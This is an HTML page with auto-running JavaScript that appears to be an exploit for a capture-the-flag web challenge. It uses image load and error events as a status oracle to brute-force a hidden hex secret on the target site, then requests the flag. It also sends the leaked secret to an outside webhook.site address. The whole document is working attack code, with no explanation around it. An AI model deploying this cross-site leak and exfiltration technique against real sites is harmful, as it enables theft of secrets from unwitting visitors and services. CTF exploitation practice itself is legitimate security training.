<!DOCTYPE html>
<html>
<body>
<script>
// SIMPLER EXPLOIT - Less likely to be blocked
const CHALLENGE = 'https://append-note-1rzrc.instancer.lac.tf';
const WEBHOOK = 'https://webhook.site/fec1c809-22c7-4a31-b557-829ded3215d2';

// Phase 1: Leak secret using IMG tags (old school)
function bruteForceWithImages() {
    let secret = '';
    const hex = '0123456789abcdef';
    
    // Create a hidden iframe for requests
    const iframe = document.createElement('iframe');
    iframe.style.display = 'none';
    document.body.appendChild(iframe);
    
    // Function to test one character
    function testChar(index, char) {
        return new Promise((resolve) => {
            const guess = secret + char;
            const testUrl = `${CHALLENGE}/append?content=${guess}&url=/`;
            
            // Use image onerror/onload to detect status
            const img = new Image();
            img.onload = function() {
                // 200 status - image loaded (redirect page loaded)
                secret = guess;
                console.log(`Found: ${secret}`);
                resolve(true);
            };
            img.onerror = function() {
                // 404 status - image failed to load
                resolve(false);
            };
            
            // Set a timeout to handle slow responses
            setTimeout(() => resolve(false), 1000);
            
            img.src = testUrl;
        });
    }
    
    // Brute force loop
    async function bruteLoop() {
        for(let i = 0; i < 8; i++) {
            let found = false;
            for(let c of hex) {
                if(await testChar(i, c)) {
                    found = true;
                    break;
                }
            }
            if(!found) break;
        }
        
        // Once secret found, get flag
        if(secret.length === 8) {
            console.log(`Final secret: ${secret}`);
            
            // Method 1: Use iframe to fetch flag
            iframe.src = `${CHALLENGE}/flag?secret=${secret}`;
            
            // Method 2: Send to webhook via image
            const exfilImg = new Image();
            exfilImg.src = `${WEBHOOK}?secret=${secret}`;
            
            // Method 3: Redirect to get flag (most reliable)
            setTimeout(() => {
                // Create form to make POST-like request
                const form = document.createElement('form');
                form.method = 'GET';
                form.action = `${CHALLENGE}/flag?secret=${secret}`;
                document.body.appendChild(form);
                form.submit();
            }, 1000);
        }
    }
    
    bruteLoop();
}

// Start when page loads
window.onload = bruteForceWithImages;
</script>
<h1>Loading...</h1>
</body>
</html>
